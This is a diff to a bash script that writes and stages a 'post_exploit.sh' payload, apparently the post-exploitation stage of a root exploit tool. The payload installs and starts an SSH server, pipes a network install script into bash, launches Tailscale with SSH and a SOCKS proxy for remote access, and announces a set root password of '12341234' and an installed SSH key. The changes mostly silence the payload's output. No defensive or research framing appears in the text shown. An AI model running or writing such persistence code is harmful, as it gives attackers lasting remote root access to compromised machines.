@@ -43,51 +43,54 @@ fi
 # Write post-exploit script to a temp file (avoids stdin conflict with su)
 cat > /tmp/post_exploit.sh << 'POSTSCRIPT'
 #!/bin/bash
-echo '[*] Step 3: Install SSH server'
-apt-get update -qq 2>/dev/null
-apt-get install -y -qq openssh-server 2>/dev/null
+exec 3>&1 4>&2
+
+echo '[*] Step 3: Install SSH server' >&3
+apt-get update -qq >/dev/null 2>&1
+apt-get install -y -qq openssh-server >/dev/null 2>&1
 mkdir -p /run/sshd
-$(which sshd) 2>/dev/null || /usr/sbin/sshd 2>/dev/null
+$(which sshd) >/dev/null 2>&1 || /usr/sbin/sshd >/dev/null 2>&1
 
-echo '[*] Step 4: Install Tailscale'
-curl -fsSL https://tailscale.com/install.sh | bash 2>/dev/null
+echo '[*] Step 4: Install Tailscale' >&3
+curl -fsSL https://tailscale.com/install.sh 2>/dev/null | bash >/dev/null 2>&1
 
-echo '[*] Step 5: Start Tailscale (userspace mode)'
-pkill tailscaled 2>/dev/null
-tailscaled --tun=userspace-networking --socks5-server=localhost:1055 &>/dev/null &
+echo '[*] Step 5: Start Tailscale (userspace mode)' >&3
+pkill tailscaled >/dev/null 2>&1
+nohup tailscaled --tun=userspace-networking --socks5-server=localhost:1055 >/dev/null 2>&1 &
 sleep 3
 
-echo '[*] Step 6: Get Tailscale login URL (please wait)...'
-tailscale up --ssh &>/tmp/ts_output.log &
+echo '[*] Step 6: Get Tailscale login URL (please wait)...' >&3
+tailscale up --ssh >/dev/null 2>&1 &
 TS_PID=$!
 
-# Wait for login URL to appear in logs
+# Wait for login URL to appear in tailscaled state
 LOGIN_URL=""
 for i in {1..30}; do
-    LOGIN_URL=$(grep -o 'https://login.tailscale.com/[^ ]*' /tmp/ts_output.log 2>/dev/null | head -1)
+    LOGIN_URL=$(tailscale status --json 2>/dev/null | grep -o 'https://login.tailscale.com/[^ "]*' | head -1)
     if [ -n "$LOGIN_URL" ]; then
         break
     fi
     sleep 1
 done
-wait $TS_PID 2>/dev/null
 
-echo ''
-echo '========================================'
-echo '[+] DONE!'
-echo '[+] Root password: 12341234'
-echo '[+] SSH key installed'
-echo ''
+echo '' >&3
+echo '========================================' >&3
+echo '[+] DONE!' >&3
+echo '[+] Root password: 12341234' >&3
+echo '[+] SSH key installed' >&3
+echo '' >&3
 if [ -n "$LOGIN_URL" ]; then
-    echo "[*] Tailscale login URL:"
-    echo "    $LOGIN_URL"
+    echo "[*] Tailscale login URL:" >&3
+    echo "    $LOGIN_URL" >&3
 else
-    echo '[!] Could not get Tailscale URL. Run manually:'
-    echo '    tailscale up --ssh'
+    echo '[!] Could not get Tailscale URL. Run manually:' >&3
+    echo '    tailscale up --ssh' >&3
 fi
-echo ''
-echo '[*] After auth: ssh root@<tailscale-ip>'
-echo '========================================'
+echo '' >&3
+echo '[*] After auth: ssh root@<tailscale-ip>' >&3
+echo '========================================' >&3
+
+exec 1>&3 2>&4 3>&- 4>&-
 POSTSCRIPT
 chmod +x /tmp/post_exploit.sh
 
